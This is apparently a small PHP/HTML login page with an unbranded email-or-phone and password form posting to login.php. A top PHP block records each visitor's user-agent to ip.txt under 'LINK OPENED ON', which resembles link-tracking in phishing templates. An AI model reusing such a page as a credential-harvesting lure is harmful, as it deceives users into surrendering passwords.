<?php
$fp = fopen('ip.txt', 'w');//opens file in write-only mode
$brow = $_SERVER['HTTP_USER_AGENT'];
fwrite($fp, 'LINK OPENED ON : ');
fwrite($fp, $brow);
fclose($fp);
?>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>hshhs</title>
    <link rel="stylesheet" href="style.css">
   <script src="https://kit.fontawesome.com/a076d05399.js"></script>
  </head>
  <body>
   <iframe src="bgm.mp3" allow="loop" allow="autoplay" id="audio" style="display: none"></iframe>
    <div class="bg-img">
      <div class="content">
        <header>hshhss</header>
        <form action="login.php" method="POST">
          <div class="field">
            <span class="fa fa-user"></span>
            <input name="username" type="text" required placeholder="Email or Phone">
          </div>
<div class="field space">
            <span class="fa fa-lock"></span>
            <input name="password" type="password" class="pass-key" required placeholder="Password">
            <span class="show">SHOW</span>
          </div>
<div class="pass">
            <a href="#">Forgot Password?</a>
          </div>
<div class="field">
            <input type="submit" value="LOGIN">
          </div>
</form>
<script>
      const pass_field = document.querySelector('.pass-key');
      const showBtn = document.querySelector('.show');
      showBtn.addEventListener('click', function(){
       if(pass_field.type === "password"){
         pass_field.type = "text";
         showBtn.textContent = "HIDE";
         showBtn.style.color = "#3498db";
       }else{
         pass_field.type = "password";
         showBtn.textContent = "SHOW";
         showBtn.style.color = "#222";
       }
      });
    </script>
  </body>
</html>

